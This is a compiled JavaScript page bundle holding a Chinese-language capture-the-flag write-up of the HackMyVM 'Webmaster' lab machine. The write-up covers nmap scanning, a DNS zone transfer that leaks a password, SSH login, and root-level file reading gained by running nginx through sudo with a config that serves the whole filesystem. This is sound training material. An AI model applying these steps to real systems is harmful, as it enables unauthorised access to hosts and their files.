"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[2176],{33325:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>h,frontMatter:()=>t,metadata:()=>c,toc:()=>d});var r=s(85893),a=s(11151);const t={},i="Webmaster",c={id:"HackMyVM/Machines/Webmaster/index",title:"Webmaster",description:"[Linux VM] [Tested on VirtualBox] created by || sml",source:"@site/docs/HackMyVM/Machines/Webmaster/index.md",sourceDirName:"HackMyVM/Machines/Webmaster",slug:"/HackMyVM/Machines/Webmaster/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Webmaster/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Webmaster/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Vulny",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Vulny/"},next:{title:"Whitedoor",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Whitedoor/"}},l={},d=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"\u63a2\u6d4b web \u670d\u52a1",id:"\u63a2\u6d4b-web-\u670d\u52a1",level:2},{value:"\u63a2\u6d4b DNS \u670d\u52a1",id:"\u63a2\u6d4b-dns-\u670d\u52a1",level:2},{value:"\u51ed\u636e\u5229\u7528",id:"\u51ed\u636e\u5229\u7528",level:2},{value:"user pwned",id:"user-pwned",level:2},{value:"\u63d0\u6743\u63a2\u6d4b",id:"\u63d0\u6743\u63a2\u6d4b",level:2},{value:"\u5c1d\u8bd5\u63d0\u6743\u81f3\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6",id:"\u5c1d\u8bd5\u63d0\u6743\u81f3\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6",level:2},{value:"root pwned",id:"root-pwned",level:2}];function o(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,a.a)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"webmaster",children:"Webmaster"})}),"\n",(0,r.jsxs)(n.admonition,{type:"note",children:[(0,r.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || sml"}),(0,r.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2020-12-05"}),(0,r.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 218365d6a1fab7967e1e43364bb80be3"}),(0,r.jsx)(n.p,{children:"\u2620 Root // 166"}),(0,r.jsx)(n.p,{children:"\ud83d\udc80 User // 173"}),(0,r.jsx)(n.p,{children:"\ud83d\udcddNotes //\nHack and Fun. Tested on Virtualbox."})]}),"\n",(0,r.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u9776\u673a\u542f\u52a8",src:s(27039).Z+"",width:"1020",height:"687"})}),"\n",(0,r.jsx)(n.p,{children:"\u9776\u673a IP\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.115\n"})}),"\n",(0,r.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 192.168.56.115\nHost is up (0.00053s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 6d7ed2d5d04536d7c9ed3e1d5c86fbe4 (RSA)\n|   256 049d9adeaf31331c7c244a973876f5f7 (ECDSA)\n|_  256 b08cedea130f032af3608ac3ba684abe (ED25519)\n53/tcp open  domain  (unknown banner: not currently available)\n| fingerprint-strings:\n|   DNSVersionBindReqTCP:\n|     version\n|     bind\n|_    currently available\n| dns-nsid:\n|_  bind.version: not currently available\n80/tcp open  http    nginx 1.14.2\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: nginx/1.14.2\nMAC Address: 08:00:27:DB:73:D5 (Oracle VirtualBox virtual NIC)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/).\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\u63a2\u6d4b-web-\u670d\u52a1",children:"\u63a2\u6d4b web \u670d\u52a1"}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u8bbf\u95ee"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u8bbf\u95ee /",src:s(24652).Z+"",width:"1139",height:"763"})}),"\n",(0,r.jsx)(n.p,{children:"\u68c0\u67e5\u539f\u59cb\u8fd4\u56de"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500[randark@randark-Parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $http get 192.168.56.115\nHTTP/1.1 200 OK\nConnection: keep-alive\nContent-Encoding: gzip\nContent-Type: text/html\nDate: Fri, 29 Dec 2023 08:38:01 GMT\nETag: W/"5fcb5787-39"\nLast-Modified: Sat, 05 Dec 2020 09:48:55 GMT\nServer: nginx/1.14.2\nTransfer-Encoding: chunked\n\n<img src="comic.png" alt="comic">\n\x3c!--webmaster.hmv--\x3e\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u5176\u4e2d\u53d1\u73b0\u4e00\u4e2a\u7591\u4f3c\u57df\u540d\u7684\u5b57\u7b26\u4e32"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"webmaster.hmv\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u7ed3\u5408\u4e4b\u524d\u7aef\u53e3\u626b\u63cf\u53d1\u73b0\u7684 DNS \u670d\u52a1\uff0c\u6000\u7591\u53ef\u80fd\u505a\u4e86\u57df\u540d\u89e3\u6790\uff0c\u6dfb\u52a0 hosts \u89e3\u6790\u8bb0\u5f55"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"# Host addresses\n127.0.0.1  localhost\n127.0.1.1  randark-Parrot\n::1        localhost ip6-localhost ip6-loopback\nff02::1    ip6-allnodes\nff02::2    ip6-allrouters\n\n192.168.56.115 webmaster.hmv\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u7136\u540e\u5c1d\u8bd5\u8bbf\u95ee ",(0,r.jsx)(n.code,{children:"webmaster.hmv"})," \uff0c\u53d1\u73b0\u57df\u540d\u5e76\u975e\u53ef\u4ee5\u89e3\u6790\u7684\u57df\u540d\uff0c\u6000\u7591\u5f97\u901a\u8fc7 DNS \u670d\u52a1\u8fdb\u884c\u67e5\u8be2"]}),"\n",(0,r.jsx)(n.h2,{id:"\u63a2\u6d4b-dns-\u670d\u52a1",children:"\u63a2\u6d4b DNS \u670d\u52a1"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="dig axfr @192.168.56.115 webmaster.hmv"',children:'; <<>> DiG 9.18.12-1~bpo11+1-Debian <<>> axfr @192.168.56.115 webmaster.hmv\n; (1 server found)\n;; global options: +cmd\nwebmaster.hmv.          604800  IN      SOA     ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800\nwebmaster.hmv.          604800  IN      NS      ns1.webmaster.hmv.\nftp.webmaster.hmv.      604800  IN      CNAME   www.webmaster.hmv.\njohn.webmaster.hmv.     604800  IN      TXT     "Myhiddenpazzword"\nmail.webmaster.hmv.     604800  IN      A       192.168.0.12\nns1.webmaster.hmv.      604800  IN      A       127.0.0.1\nwww.webmaster.hmv.      604800  IN      A       192.168.0.11\nwebmaster.hmv.          604800  IN      SOA     ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800\n;; Query time: 0 msec\n;; SERVER: 192.168.56.115#53(192.168.56.115) (TCP)\n;; WHEN: Fri Dec 29 18:25:41 CST 2023\n;; XFR size: 8 records (messages 1, bytes 274)\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u53d1\u73b0\u4ee5\u4e0b\u8bb0\u5f55"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:'john.webmaster.hmv. --- "Myhiddenpazzword"\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u6000\u7591\u662f\u4e00\u5bf9\u51ed\u636e"}),"\n",(0,r.jsx)(n.h2,{id:"\u51ed\u636e\u5229\u7528",children:"\u51ed\u636e\u5229\u7528"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@randark-Parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs john@192.168.56.115\n[18:30:07] Welcome to pwncat \ud83d\udc08!                                                                                                                         __main__.py:164\nPassword: ****************\n[18:30:11] 192.168.56.115:22: normalizing shell path                                                                                                      manager.py:957\n[18:30:12] 192.168.56.115:22: registered new host w/ db                                                                                                   manager.py:957\n(local) pwncat$ back\n(remote) john@webmaster:/home/john$ whoami\njohn\n"})}),"\n",(0,r.jsx)(n.h2,{id:"user-pwned",children:"user pwned"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"(remote) john@webmaster:/home/john$ cat user.txt\nHMVdnsyo\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\u63d0\u6743\u63a2\u6d4b",children:"\u63d0\u6743\u63a2\u6d4b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for john on webmaster:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser john may run the following commands on webmaster:\n    (ALL : ALL) NOPASSWD: /usr/sbin/nginx\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="find / -perm -u=s -type f 2>/dev/null"',children:"/usr/bin/umount\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/mount\n/usr/bin/passwd\n/usr/bin/su\n/usr/bin/gpasswd\n/usr/bin/chsh\n/usr/bin/sudo\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="getcap -r / 2>/dev/null"',children:"/usr/bin/ping = cap_net_raw+ep\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u53ef\u4ee5\u53d1\u73b0 ",(0,r.jsx)(n.code,{children:"nginx"})," \u53ef\u4ee5\u501f\u52a9 ",(0,r.jsx)(n.code,{children:"sudo"})," \u4ee5 root \u6743\u9650\u6267\u884c"]}),"\n",(0,r.jsx)(n.h2,{id:"\u5c1d\u8bd5\u63d0\u6743\u81f3\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6",children:"\u5c1d\u8bd5\u63d0\u6743\u81f3\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"}),"\n",(0,r.jsxs)(n.p,{children:["\u7ed3\u5408 ",(0,r.jsx)(n.code,{children:"nginx"})," \u7684\u7279\u6027\uff0c\u5c1d\u8bd5\u5c06\u6839\u76ee\u5f55\u8fdb\u884c\u6620\u5c04"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"user root;\nevents {\n    worker_connections 1024;\n}\nhttp {\n    server {\n        listen 8080;\n        root /;\n        autoindex on;\n    }\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u7136\u540e\u4f7f\u7528\u6b64\u914d\u7f6e\u6587\u4ef6\u542f\u52a8 nginx"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"(remote) john@webmaster:/home/john$ sudo /usr/sbin/nginx -c /home/john/root.conf\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5373\u53ef\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u8bbf\u95ee :8080",src:s(74544).Z+"",width:"1139",height:"763"})}),"\n",(0,r.jsx)(n.h2,{id:"root-pwned",children:"root pwned"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"HMVnginxpwnd\n"})})]})}function h(e={}){const{wrapper:n}={...(0,a.a)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(o,{...e})}):o(e)}},24652:(e,n,s)=>{s.d(n,{Z:()=>r});const r=s.p+"assets/images/image_20231210-181025-7d7010453448ed15318ecc19fc38b316.png"},27039:(e,n,s)=>{s.d(n,{Z:()=>r});const r=s.p+"assets/images/image_20231233-163352-c954d052c18aef958f5305b41a6ff770.png"},74544:(e,n,s)=>{s.d(n,{Z:()=>r});const r=s.p+"assets/images/image_20231244-184446-43be620376febce4d6a0cfdab16b2961.png"},11151:(e,n,s)=>{s.d(n,{Z:()=>c,a:()=>i});var r=s(67294);const a={},t=r.createContext(a);function i(e){const n=r.useContext(t);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),r.createElement(t.Provider,{value:n},e.children)}}}]);